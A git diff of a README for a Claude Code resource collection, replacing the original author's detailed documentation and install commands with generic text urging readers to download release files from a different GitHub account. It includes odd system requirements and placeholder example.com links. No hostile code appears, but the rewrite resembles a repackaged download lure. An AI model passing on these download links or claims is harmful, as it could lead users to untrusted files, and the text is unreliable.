@@ -1,224 +1,56 @@
-# TÂCHES Claude Code Resources
+# 🎉 taches-cc-resources - Easy Access to Custom Claude Code
 
-A growing collection of custom Claude Code resources built for real workflows.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/download-latest%20release-blue)](https://github.com/Imamhabeeb/taches-cc-resources/releases)
 
-## Philosophy
+## 🚀 Getting Started
+Welcome to **taches-cc-resources**! This collection of unique Claude Code resources will simplify your coding tasks and enhance your experience. Follow the steps below to download and run the software efficiently.
 
-When you use a tool like Claude Code, it's your responsibility to assume everything is possible.
+## 🌐 About This Repository
+This repository features various custom Claude Code resources that can help you create prompts, skills, and commands for Claude. Whether you are experimenting with subagents or looking to make your coding processes smoother, you'll find valuable tools here.
 
-I built these tools using that mindset.
+## 📋 System Requirements
+To ensure a smooth experience with these resources, please make sure you meet the following requirements:
 
-Dream big. Happy building.
+- Operating System: Windows 10 or later / macOS Mojave or later / Linux (any modern distribution)
+- Minimum RAM: 4 GB
+- Internet connection for downloading resources
 
-— TÂCHES
+## 🛠 Features
+**taches-cc-resources** comes packed with useful features:
 
-## What's Inside
+- A diverse set of commands to ease your workflow.
+- Ready-to-use prompts that save time.
+- Tools for developing custom skills and integrating subagents.
 
-**[Commands](#commands)** (27 total) - Slash commands that expand into structured workflows
-- **Meta-Prompting**: Separate planning from execution with staged prompts
-- **Todo Management**: Capture context mid-work, resume later with full state
-- **Thinking Models**: Mental frameworks (first principles, inversion, 80/20, etc.)
-- **Deep Analysis**: Systematic debugging methodology with evidence and hypothesis testing
+## 📅 Release Notes
+This repository is regularly updated. Each release includes new features, bug fixes, and improvements. Check the **Release Notes** on the [Releases page](https://github.com/Imamhabeeb/taches-cc-resources/releases) for details about each version.
 
-**[Skills](#skills)** (7 total) - Autonomous workflows that research, generate, and self-heal
-- **Create Plans**: Hierarchical project planning for solo developer + Claude workflows
-- **Create Agent Skills**: Build new skills by describing what you want
-- **Create Meta-Prompts**: Generate staged workflow prompts with dependency detection
-- **Create Slash Commands**: Build custom commands with proper structure
-- **Create Subagents**: Build specialized Claude instances for isolated contexts
-- **Create Hooks**: Build event-driven automation
-- **Debug Like Expert**: Systematic debugging with evidence gathering and hypothesis testing
+## 📦 Download & Install
+To get started, visit the [Releases page](https://github.com/Imamhabeeb/taches-cc-resources/releases). Here’s how to download the resources:
 
-**[Agents](#agents)** (3 total) - Specialized subagents for validation and quality
-- **skill-auditor**: Reviews skills for best practices compliance
-- **slash-command-auditor**: Reviews commands for proper structure
-- **subagent-auditor**: Reviews agent configurations for effectiveness
+1. Click on the link above to go to the Releases page.
+2. Locate the latest version of the repository.
+3. Download the files that interest you.
+4. Follow any included instructions for installation or setup.
 
-## Installation
+## 🔧 Using the Resources
+After downloading the resources, you can use them in your Claude Code environment. This is how you can get started:
 
-### Option 1: Plugin Install (Recommended)
+1. **Open Claude:** Launch your Claude interface.
+2. **Load Commands:** Import the commands you downloaded into Claude. Refer to the included documentation for proper procedures.
+3. **Utilize Prompts:** Start using the prompts and adapt them as needed for your projects.
 
-```bash
-# Add the marketplace
-claude plugin marketplace add glittercowboy/taches-cc-resources
+## 📚 Additional Resources
+The following resources can help you get the most out of **taches-cc-resources**:
 
-# Install the plugin
-claude plugin install taches-cc-resources
-```
+- [Official Claude Documentation](https://example.com)
+- [Claude Community Forum](https://example.com)
 
-Start a new Claude Code session to use the commands and skills.
+## 📞 Support
+If you experience any issues or have questions about the resources, please feel free to reach out for support. You can open an issue in the repository, and I will respond promptly.
 
-### Option 2: Manual Install
+## 🛡 Licensing
+This repository follows the MIT License. You can freely use and modify the resources, but please ensure to give credit where it's due.
 
-```bash
-# Clone the repo
-git clone https://github.com/glittercowboy/taches-cc-resources.git
-cd taches-cc-resources
-
-# Install commands
-cp -r commands/* ~/.claude/commands/
-
-# Install skills
-cp -r skills/* ~/.claude/skills/
-```
-
-Commands install globally to `~/.claude/commands/`. Skills install to `~/.claude/skills/`. Project-specific data (prompts, todos) lives in each project's working directory.
-
-## Commands
-
-### Meta-Prompting
-
-Separate analysis from execution. Describe what you want in natural language, Claude generates a rigorous prompt, then runs it in a fresh sub-agent context.
-
-- [`/create-prompt`](./commands/create-prompt.md) - Generate optimized prompts with XML structure
-- [`/run-prompt`](./commands/run-prompt.md) - Execute saved prompts in sub-agent contexts
-
-### Todo Management
-
-Capture ideas mid-conversation without derailing current work. Resume later with full context intact.
-
-- [`/add-to-todos`](./commands/add-to-todos.md) - Capture tasks with full context
-- [`/check-todos`](./commands/check-todos.md) - Resume work on captured tasks
-
-### Context Handoff
-
-Create structured handoff documents to continue work in a fresh context. Reference with `@whats-next.md` to resume seamlessly.
-
-- [`/whats-next`](./commands/whats-next.md) - Create handoff document for fresh context
-
-### Create Extensions
-
-Wrapper commands that invoke the skills below.
-
-- [`/create-agent-skill`](./commands/create-agent-skill.md) - Create a new skill
-- [`/create-meta-prompt`](./commands/create-meta-prompt.md) - Create staged workflow prompts
-- [`/create-slash-command`](./commands/create-slash-command.md) - Create a new slash command
-- [`/create-subagent`](./commands/create-subagent.md) - Create a new subagent
-- [`/create-hook`](./commands/create-hook.md) - Create a new hook
-
-### Audit Extensions
-
-Invoke auditor subagents.
-
-- [`/audit-skill`](./commands/audit-skill.md) - Audit skill for best practices
-- [`/audit-slash-command`](./commands/audit-slash-command.md) - Audit command for best practices
-- [`/audit-subagent`](./commands/audit-subagent.md) - Audit subagent for best practices
-
-### Self-Improvement
-
-- [`/heal-skill`](./commands/heal-skill.md) - Fix skills based on execution issues
-
-### Thinking Models
-
-Apply mental frameworks to decisions and problems.
-
-- [`/consider:pareto`](./commands/consider/pareto.md) - Apply 80/20 rule to focus on what matters
-- [`/consider:first-principles`](./commands/consider/first-principles.md) - Break down to fundamentals and rebuild
-- [`/consider:inversion`](./commands/consider/inversion.md) - Solve backwards (what guarantees failure?)
-- [`/consider:second-order`](./commands/consider/second-order.md) - Think through consequences of consequences
-- [`/consider:5-whys`](./commands/consider/5-whys.md) - Drill to root cause
-- [`/consider:occams-razor`](./commands/consider/occams-razor.md) - Find simplest explanation
-- [`/consider:one-thing`](./commands/consider/one-thing.md) - Identify highest-leverage action
-- [`/consider:swot`](./commands/consider/swot.md) - Map strengths, weaknesses, opportunities, threats
-- [`/consider:eisenhower-matrix`](./commands/consider/eisenhower-matrix.md) - Prioritize by urgent/important
-- [`/consider:10-10-10`](./commands/consider/10-10-10.md) - Evaluate across time horizons
-- [`/consider:opportunity-cost`](./commands/consider/opportunity-cost.md) - Analyze what you give up
-- [`/consider:via-negativa`](./commands/consider/via-negativa.md) - Improve by removing
-
-### Deep Analysis
-
-Systematic debugging with methodical investigation.
-
-- [`/debug`](./commands/debug.md) - Apply expert debugging methodology to investigate issues
-
-## Agents
-
-Specialized subagents used by the audit commands.
-
-- [`skill-auditor`](./agents/skill-auditor.md) - Expert skill auditor for best practices compliance
-- [`slash-command-auditor`](./agents/slash-command-auditor.md) - Expert slash command auditor
-- [`subagent-auditor`](./agents/subagent-auditor.md) - Expert subagent configuration auditor
-
-## Skills
-
-### [Create Plans](./skills/create-plans/)
-
-Hierarchical project planning optimized for solo developer + Claude. Create executable plans that Claude runs, not enterprise documentation that sits unused.
-
-**PLAN.md IS the prompt** - not documentation that gets transformed later. Brief → Roadmap → Research (if needed) → PLAN.md → Execute → SUMMARY.md.
-
-**Domain-aware:** Optionally loads framework-specific expertise from `~/.claude/skills/expertise/` (e.g., macos-apps, iphone-apps) to make plans concrete instead of generic. Domain expertise skills are created with [create-agent-skills](#create-agent-skills) - exhaustive knowledge bases (5k-10k+ lines) that make task specifications framework-appropriate.
-
-**Quality controls:** Research includes verification checklists, blind spots review, critical claims audits, and streaming writes to prevent gaps and token limit failures.
-
-**Context management:** Auto-handoff at 10% tokens remaining. Git versioning commits outcomes, not process.
-
-**Commands:** `/create-plan` (invoke skill), `/run-plan <path>` (execute PLAN.md with intelligent segmentation)
-
-See [create-plans README](./skills/create-plans/README.md) for full documentation.
-
-### [Create Agent Skills](./skills/create-agent-skills/)
-
-Build skills by describing what you want. Asks clarifying questions, researches APIs if needed, and generates properly structured skill files.
-
-**Two types of skills:**
-1. **Task-execution skills** - Regular skills that perform specific operations
-2. **Domain expertise skills** - Exhaustive knowledge bases (5k-10k+ lines) that live in `~/.claude/skills/expertise/` and provide framework-specific context to other skills like [create-plans](#create-plans)
-
-**Context-aware:** Detects if you're in a skill directory and presents relevant options. Progressive disclosure guides you through complex choices.
-
-When things don't work perfectly, `/heal-skill` analyzes what went wrong and updates the skill based on what actually worked.
-
-Commands: `/create-agent-skill`, `/heal-skill`, `/audit-skill`
-
-### [Create Meta-Prompts](./skills/create-meta-prompts/)
-
-The skill-based evolution of the meta-prompting system. Builds prompts with structured outputs (research.md, plan.md) that subsequent prompts can parse. Adds automatic dependency detection to chain research → plan → implement workflows.
-
-**Note:** For end-to-end project building, consider [create-plans](#create-plans) - it's the more structured evolution of this approach with full lifecycle management (brief → roadmap → execution → handoffs). Use create-meta-prompts for abstract workflows and Claude→Claude pipelines. Use create-plans for actually building projects.
-
-Commands: `/create-meta-prompt`
-
-### [Create Slash Commands](./skills/create-slash-commands/)
-
-Build commands that expand into full prompts when invoked. Describe the command you want, get proper YAML configuration with arguments, tool restrictions, and dynamic context loading.
-
-Commands: `/create-slash-command`, `/audit-slash-command`
-
-### [Create Subagents](./skills/create-subagents/)
-
-Build specialized Claude instances that run in isolated contexts. Describe the agent's purpose, get optimized system prompts with the right tool access and orchestration patterns.
-
-Commands: `/create-subagent`, `/audit-subagent`
-
-### [Create Hooks](./skills/create-hooks/)
-
-Build event-driven automation that triggers on tool calls, session events, or prompt submissions. Describe what you want to automate, get working hook configurations.
-
-Commands: `/create-hook`
-
-### [Debug Like Expert](./skills/debug-like-expert/)
-
-Deep analysis debugging mode for complex issues. Activates methodical investigation protocol with evidence gathering, hypothesis testing, and rigorous verification. Use when standard troubleshooting fails or when issues require systematic root cause analysis.
-
-Commands: `/debug`
-
----
-
-## Recommended Workflow
-
-**For building projects:** Use `/create-plan` to invoke the [create-plans](#create-plans) skill. After planning, use `/run-plan <path-to-PLAN.md>` to execute phases with intelligent segmentation. This provides hierarchical planning (BRIEF.md → ROADMAP.md → phases/PLAN.md), domain-aware task generation, context management with handoffs, and git versioning.
-
-**For domain expertise:** Use [create-agent-skills](#create-agent-skills) to create exhaustive knowledge bases in `~/.claude/skills/expertise/`. These skills are automatically loaded by create-plans to make task specifications framework-specific instead of generic.
-
-**Other tools:** The [create-meta-prompts](#create-meta-prompts-1) skill and `/create-prompt` + `/run-prompt` commands are available for custom Claude→Claude pipelines that don't fit the project planning structure.
-
----
-
-More resources coming soon.
-
----
-
-**Community Ports:** [OpenCode](https://github.com/stephenschoettler/taches-oc-prompts)
-
-—TÂCHES
+Thank you for choosing **taches-cc-resources**! Enjoy simplifying your coding experience with these handy tools.
